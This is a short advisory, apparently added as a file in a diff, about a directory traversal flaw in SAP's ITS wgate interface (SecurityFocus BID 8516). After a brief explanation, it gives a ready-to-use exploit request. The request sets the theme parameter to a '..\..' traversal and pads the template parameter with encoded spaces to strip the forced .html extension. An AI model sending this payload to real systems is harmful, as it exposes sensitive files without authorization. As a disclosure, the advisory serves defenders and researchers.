@@ -1,0 +1,15 @@
+source: http://www.securityfocus.com/bid/8516/info
+
+SAP is said to be prone to a directory traversal vulnerability, potentially allowing users to disclose the contents of sensitive files. The problem occurs due to the application failing to parse user-supplied input for directory traversal sequences (../) and due to correct bounds checking verification, making it possible to bypass the appending of the .html exentsion to requested files. As a result, it may be possible to access sensitive files residing outside of the requested location.
+
+http://www.server.name/scripts/wgate/pbw2/!?
+
+with params:
+~language=en&
+~runtimemode=DM&
+~templatelanguage=&
+~language=en&
+~theme=..\..&
+~template=services\global.srvc+++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++
+
+(where "+" stands for spaces "%20" uri encoded). 
